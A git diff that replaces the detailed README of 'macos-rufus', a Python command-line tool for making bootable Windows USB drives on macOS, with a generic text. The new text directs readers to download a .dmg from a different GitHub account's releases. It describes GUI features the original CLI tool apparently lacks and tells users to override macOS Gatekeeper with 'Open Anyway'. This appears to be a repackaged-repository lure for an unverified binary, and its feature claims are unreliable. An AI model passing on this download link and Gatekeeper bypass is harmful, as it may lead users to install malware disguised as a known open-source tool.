@@ -1,349 +1,81 @@
-# 🖥️ macos-rufus
+# 💾 macos-rufus - Create Windows installation drives on Mac
 
-> **The Rufus alternative for macOS** — create bootable Windows 7 / 8 / 8.1 / 10 / 11 USB drives directly from your Mac. No VMs, no Boot Camp, no nonsense.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/farflung-dearest512/macos-rufus/releases)
 
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![macOS](https://img.shields.io/badge/macOS-12%2B-000000?style=flat-square&logo=apple&logoColor=white)](https://apple.com/macos)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
-[![Windows 7](https://img.shields.io/badge/Windows-7-0078D6?style=flat-square&logo=windows&logoColor=white)](https://microsoft.com)
-[![Windows 10](https://img.shields.io/badge/Windows-10-0078D6?style=flat-square&logo=windows&logoColor=white)](https://microsoft.com)
-[![Windows 11](https://img.shields.io/badge/Windows-11-0078D6?style=flat-square&logo=windows11&logoColor=white)](https://microsoft.com)
+This application creates bootable Windows USB drives using your Mac. You do not need virtual machines or Boot Camp software. The tool handles modern UEFI systems and older BIOS hardware. It splits large installation files automatically so Windows 11 installs work on any USB drive.
 
----
+## 📋 System Requirements
 
-## 📌 What Is This?
+Ensure you meet these requirements before you start:
 
-**macos-rufus** is an open-source command-line tool for macOS that does exactly one thing, perfectly: it turns a Windows ISO file into a bootable USB drive — for every Windows version from 7 to 11.
+- A Mac computer running macOS 10.15 or newer.
+- An empty USB flash drive with at least 16 GB of space.
+- An official Windows ISO file downloaded from the Microsoft website.
+- An active internet connection for the initial setup.
 
-If you've ever searched for:
+## 📥 Downloading the Tool
 
-- *"Rufus for Mac"*
-- *"How to create bootable Windows USB on macOS"*
-- *"Make Windows 11 bootable USB from Mac"*
-- *"Rufus alternative macOS"*
-- *"Create Windows 7 bootable USB on Mac"*
-- *"dd command Windows ISO Mac"* (hint: `dd` doesn't work for Windows ISOs)
-- *"How to install Windows from a Mac without Boot Camp"*
+Follow these steps to acquire the software:
 
-…you found the right tool.
+1. Visit the [official release page](https://github.com/farflung-dearest512/macos-rufus).
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in .dmg to begin the download.
+4. Save the file to your Downloads folder.
 
----
+## ⚙️ Installation Instructions
 
-## ✨ Features
+Mac applications require a quick setup process:
 
-| Feature | Details |
-|---|---|
-| **Windows 7, 8, 8.1, 10, 11 support** | All versions, UEFI and legacy BIOS |
-| **Auto self-elevation** | Prompts for your password itself — no `sudo` prefix needed |
-| **Auto-installs dependencies** | Missing `wimlib`? Script offers to install via Homebrew automatically |
-| **Handles install.wim > 4 GB** | Splits oversized WIM files — the #1 cause of failure on other tools |
-| **Writes Windows VBR boot sector** | Patches `boot/bootsect.dat` from the ISO onto the USB — required for Win7 legacy BIOS boot |
-| **Sets MBR active partition flag** | Pure Python struct write — no `ms-sys` or external tool required |
-| **ISO auto-detection** | Detects UEFI vs legacy-only ISOs, warns when CSM is needed on target PC |
-| **FAT32 + MBR format** | Maximum compatibility across UEFI and legacy BIOS systems |
-| **Interactive USB picker** | Lists all connected USB drives with size and name — no guessing device paths |
-| **Safe by design** | External-only disk listing, explicit warning, manual confirm before any write |
-| **Parallel file copy** | 4-thread concurrent copy with 1 MB buffers — saturates USB write bandwidth |
-| **Beautiful terminal UI** | Powered by `rich` — color, tables, progress bars with speed + ETA |
-| **Drag-and-drop ISO path** | Drag your `.iso` file into the terminal — quoted paths handled automatically |
+1. Open the Downloads folder in Finder.
+2. Double-click the file you saved to open the disk image.
+3. Drag the application icon into your Applications folder.
+4. Eject the disk image from your desktop sidebar.
+5. Open your Applications folder and click the icon to launch the program.
 
----
+## 🚀 Creating Your Bootable Drive
 
-## 🚀 Quick Start
+Follow these steps to prepare your Windows USB:
 
-### Option 1 — Homebrew (recommended)
+1. Insert your USB flash drive into an available port on your Mac.
+2. Open the application.
+3. Click the Device dropdown menu and select your USB drive. Ensure you choose the correct drive, as this process erases all data on the selected device.
+4. Click the Select button under the Boot Selection header. Locate your Windows ISO file on your computer and open it.
+5. Choose the Partition Scheme. If you own a modern computer, select GPT. If you own a computer made before 2012, select MBR.
+6. Check the Target System field. The software detects the correct setting based on your partition choice.
+7. Click the Start button.
+8. Wait for the progress bar to reach the end. The software manages file splitting and formatting tasks in the background.
 
-```bash
-brew install yaviral17/macos-rufus/macos-rufus
-```
+## 🛠️ Understanding Features
 
-Then run from anywhere:
+This tool offers several capabilities to simplify disk creation:
 
-```bash
-macos-rufus
-```
+- Parallel Copying: The application writes multiple files at once to speed up the process.
+- Automatic WIM Splitting: Many Windows 11 installation files exceed 4GB. The tool breaks these files into smaller segments so your USB drive remains compatible with standard formats.
+- Dual Mode Support: You can choose between UEFI and Legacy BIOS firmware modes depending on your target machine.
+- File Verification: The program checks your files after copying to ensure the installation process succeeds on your target computer.
 
-> `wimlib` is installed automatically as a dependency.
+## ❓ Frequently Asked Questions
 
----
+What happens to the data on my USB drive?
+The application reformats the drive to ensure compatibility. All existing files disappear during this process. Move your important files to another location before you start.
 
-### Option 2 — Run from source
+Can I use this for Linux?
+This tool focuses on Windows installation media. It supports Windows 7 through 11.
 
-**1. Prerequisites**
+Does this tool damage my macOS installation?
+The software works only on selected USB drives. It requires your permission to access external hardware. It leaves your system files alone.
 
-Install [Homebrew](https://brew.sh) if you haven't already. That's it — the script handles the rest.
+Why does my Mac ask to open an app from an unknown developer?
+Since you downloaded this from GitHub, macOS acts to protect your security. To proceed, go to System Settings, click Privacy & Security, and select Open Anyway under the Security section.
 
-> **Optional pre-install** (script will offer this automatically if missing):
-> ```bash
-> brew install wimlib   # needed for Windows 11 ISOs where install.wim > 4 GB
-> ```
+What if the application freezes during the copy process?
+Large Windows files take time to process. Wait at least ten minutes before you close the application. If the progress bar moves, the software works correctly.
 
-**2. Clone the repo**
+## 🛡️ Important Safety Tips
 
-```bash
-git clone https://github.com/yaviral17/macos-rufus.git
-cd macos-rufus
-```
+Keep these points in mind for a smooth experience:
 
-**3. Set up the Python virtual environment**
-
-```bash
-python3 -m venv venv
-pip install -r requirements.txt
-```
-
-**4. Run it**
-
-```bash
-venv/bin/python3 rufus.py
-```
-
-> No `sudo` needed — the script detects it needs root access and prompts for your password automatically.
-
----
-
-## 📖 Step-by-Step Usage
-
-```
-╭──────────────────────────────────────────────────────────────╮
-│  macos-rufus  —  Windows bootable USB creator                │
-│          macOS · UEFI + Legacy BIOS · Win7/8/8.1/10/11       │
-╰──────────────────────────────────────────────────────────────╯
-```
-
-**Step 1 — Enter ISO path**
-
-```
-Path to Windows ISO: /Users/you/Downloads/Win11_23H2_English_x64.iso
-```
-
-Drag and drop the `.iso` file directly from Finder into the terminal — quoted paths are handled automatically.
-
-**Step 2 — ISO analysis**
-
-```
-  Property                              Value
-  UEFI boot (efi/boot/bootx64.efi)     Yes
-  Legacy BIOS boot (bootmgr)           Yes
-  VBR source (boot/bootsect.dat)       Yes
-  Detected type                        Windows 8.1 / 10 / 11
-```
-
-For Windows 7 ISOs, you'll see a warning to enable CSM/Legacy Boot on the target PC.
-
-**Step 3 — Pick your USB drive**
-
-```
-┌───────────────────────────────────────────────────────────┐
-│                    Detected USB Drives                    │
-├───┬──────────────┬────────────────────┬────────┬─────────┤
-│ # │ Device       │ Name               │   Size │ Bus     │
-├───┼──────────────┼────────────────────┼────────┼─────────┤
-│ 1 │ /dev/disk4   │ SanDisk Ultra USB  │ 32.0 GB│ USB     │
-│ 2 │ /dev/disk5   │ Kingston DataTrav… │ 64.0 GB│ USB     │
-└───┴──────────────┴────────────────────┴────────┴─────────┘
-
-Select USB drive number: 1
-```
-
-**Step 4 — Confirm**
-
-```
-WARNING: /dev/disk4 (SanDisk Ultra USB, 32.0 GB) will be completely erased.
-Proceed? [y/N]:
-```
-
-**Step 5 — Sit back**
-
-The tool will:
-1. Mount the ISO read-only via `hdiutil`
-2. Erase and format the USB as FAT32 + MBR
-3. Set the MBR active partition flag (legacy BIOS boot requirement)
-4. Write the Windows FAT32 VBR from `boot/bootsect.dat` in the ISO (Win7 support)
-5. Copy all boot files in parallel (4 threads, 1 MB buffers) with live progress bar
-6. Copy `install.wim` via `os.sendfile` with speed + ETA display — or split automatically if > 4 GiB
-7. Flush writes and unmount cleanly
-
----
-
-## ⚙️ How It Works (Technical)
-
-### Why not just use `dd`?
-
-Unlike Linux ISOs (hybrid ISOs that `dd` writes byte-for-byte), **Windows ISOs are not `dd`-compatible**. Writing a Windows ISO with `dd` produces a non-bootable USB. You need to:
-
-1. Format the USB with a real partition table (MBR) and filesystem (FAT32)
-2. Copy the ISO *contents*, not the ISO image itself
-3. Write the correct boot sector code so BIOS knows how to start Windows
-
-### The 4 GiB problem
-
-FAT32 has a hard per-file limit of 4,294,967,295 bytes (~4 GiB). Windows 11's `install.wim` often exceeds this. Most tools fail silently here.
-
-**macos-rufus** detects this automatically and uses `wimlib-imagex split` to break the WIM into 3,800 MB chunks (`install.swm`, `install2.swm`, …). The Windows installer natively reassembles split WIM files — no extra steps on the target machine.
-
-### Windows 7 legacy BIOS boot — the VBR problem
-
-This is what breaks every other "copy files to USB" approach for Windows 7:
-
-1. **MBR active partition flag** — the MBR partition table entry must have byte 0 set to `0x80` (bootable). The script writes this directly into the raw MBR using Python's `struct` — no external tool needed.
-
-2. **Windows FAT32 VBR** — `diskutil` formats the partition with a generic FAT32 Volume Boot Record. Legacy BIOS reads the VBR to find `bootmgr`, but the generic VBR doesn't know about Windows. Every Windows ISO ships `boot/bootsect.dat` — the exact VBR code Windows needs. The script reads it, merges it with the existing FAT32 BPB (bytes 3–89, which hold filesystem metadata and must be preserved), and writes the merged sector back to the raw partition device.
-
-   ```
-   FAT32 boot sector layout (512 bytes):
-     [0-2]    jump instruction     ← from bootsect.dat
-     [3-89]   FAT32 BPB            ← preserved from diskutil format
-     [90-511] Windows boot code    ← from bootsect.dat
-   ```
-
-This requires no `ms-sys`, no Wine, no Windows machine — just the ISO itself.
-
-### Partition scheme: MBR vs GPT
-
-MBR + FAT32 is chosen deliberately:
-
-- **UEFI systems** — boot via `efi/boot/bootx64.efi` (all modern Windows ISOs) — works on FAT32 + MBR
-- **Legacy BIOS systems** — boot via MBR → VBR → `bootmgr` — requires MBR scheme
-- GPT + FAT32 works on pure UEFI but breaks on BIOS — MBR is the universally safe default
-
-### Windows version compatibility
-
-| Version | UEFI boot | Legacy BIOS boot | Notes |
-|---|---|---|---|
-| Windows 7 | ❌ most ISOs | ✅ via VBR write | Enable CSM on modern PCs |
-| Windows 8 | ✅ | ✅ | Full support |
-| Windows 8.1 | ✅ | ✅ | Full support |
-| Windows 10 | ✅ | ✅ | Full support |
-| Windows 11 | ✅ | ✅ | install.wim auto-split if > 4 GiB |
-
-### Tools used under the hood
-
-| Tool | Source | Purpose |
-|---|---|---|
-| `hdiutil` | macOS built-in | Mount ISO as read-only volume |
-| `diskutil` | macOS built-in | List disks, erase, format, mount/unmount |
-| `wimlib-imagex` | Homebrew (`wimlib`) | Split install.wim > 4 GiB |
-| `rich` | pip | Terminal UI — progress bars, tables, color |
-| Python `os.sendfile` | stdlib | Kernel-space WIM copy — no userspace buffer overhead |
-| Python `ThreadPoolExecutor` | stdlib | Parallel boot file copy across 4 threads |
-| Python `struct` | stdlib | Write MBR active flag + merge VBR sectors |
-
----
-
-## 🔧 Requirements
-
-| Requirement | Version |
-|---|---|
-| macOS | 12 Monterey or later (tested on Ventura, Sonoma, Sequoia) |
-| Python | 3.11+ |
-| Homebrew | Any recent version (for wimlib auto-install) |
-| USB drive | 8 GB minimum for Windows 7/8/10, 16 GB for Windows 11 |
-
----
-
-## 📥 Getting the Windows ISO
-
-Download official ISOs directly from Microsoft:
-
-- **Windows 11**: [microsoft.com/software-download/windows11](https://www.microsoft.com/software-download/windows11)
-- **Windows 10**: [microsoft.com/software-download/windows10ISO](https://www.microsoft.com/software-download/windows10ISO)
-- **Windows 7**: [microsoft.com/software-download/windows7](https://www.microsoft.com/software-download/windows7) *(requires product key)*
-
-> **Tip for macOS users:** Microsoft's download page sometimes redirects to the Media Creation Tool (Windows-only exe). In Safari, go to **Develop → User Agent → change to any non-Windows browser** — the direct ISO download link appears.
-
----
-
-## ❓ Troubleshooting
-
-### "No external USB drives detected"
-
-- Confirm the drive appears in Finder or Disk Utility
-- Try a different USB port or cable
-- Run `diskutil list` to verify macOS sees it
-
-### "install.wim splitting fails"
-
-- Run `brew install wimlib` manually and retry
-- Check free disk space — the split writes chunks to the USB as it goes
-
-### "USB not booting on target machine"
-
-1. Enter the BIOS/UEFI boot menu (`F12`, `F2`, `Esc`, or `Del` on boot)
-2. For Windows 8.1/10/11 — select USB under **UEFI** boot entries
-3. Disable **Secure Boot** if Windows Setup won't launch (re-enable after install)
-4. For Windows 7 or older PCs — enable **CSM / Legacy Boot** in BIOS
-
-### "hdiutil: attach failed"
-
-- Verify the ISO isn't corrupted — check SHA256 against Microsoft's published hash
-- Check the ISO isn't already mounted (look in Finder sidebar or `diskutil list`)
-
-### Password prompt doesn't appear
-
-Run directly — don't use `sudo` yourself:
-```bash
-# Homebrew install
-macos-rufus
-
-# Source install
-venv/bin/python3 rufus.py
-```
-The script calls `sudo` internally via `os.execvp` and will prompt for your password.
-
----
-
-## 🛠️ Project Structure
-
-```
-macos-rufus/
-├── rufus.py          # Main CLI tool — all logic lives here
-├── requirements.txt  # Python dependencies (just: rich)
-├── venv/             # Python virtual environment (not committed)
-└── README.md         # This file
-```
-
----
-
-## 🔒 Security & Safety
-
-- **External-only disk listing** — internal drives are never shown as targets
-- **Explicit confirmation** before any destructive operation
-- **Read-only ISO mount** — source ISO is never modified
-- **Self-elevation only when needed** — script requests root via `sudo` transparently; no silent privilege escalation
-
----
-
-## 🤝 Contributing
-
-Pull requests welcome. Focus areas:
-
-- [ ] GPT + ExFAT/NTFS support for pure-UEFI installs (removes 4 GiB limit entirely)
-- [ ] Progress bar for WIM split operation (`wimlib-imagex split`)
-- [ ] ISO SHA256 verification against Microsoft checksums
-- [ ] Windows Server ISO support
-- [ ] GUI wrapper (Tkinter or native macOS via PyObjC)
-
----
-
-## 📄 License
-
-MIT — see [LICENSE](LICENSE).
-
----
-
-## 🙏 Acknowledgements
-
-- [Rufus](https://rufus.ie) — the original Windows tool this is inspired by
-- [wimlib](https://wimlib.net) — open-source WIM library that makes Windows 11 USB creation possible on non-Windows systems
-- [rich](https://github.com/Textualize/rich) — beautiful terminal output for Python
-
----
-
-<p align="center">
-  Made for every Mac user who just wants to install Windows without booting into a Windows machine first.
-</p>
-
-<p align="center">
-  <strong>macos-rufus</strong> · Rufus for Mac · Bootable Windows USB · macOS ISO Tool · Windows 7 USB Mac · Create Windows USB from macOS
-</p>
+- Do not remove the USB drive while the progress bar runs. This causes errors and may force you to start the process again.
+- Use a USB 3.0 port if possible to decrease wait times.
+- Verify your ISO file integrity before you begin. A corrupted ISO file leads to a failed Windows installation on your target computer.
+- Keep your Mac connected to a power source during the process if you use a laptop.
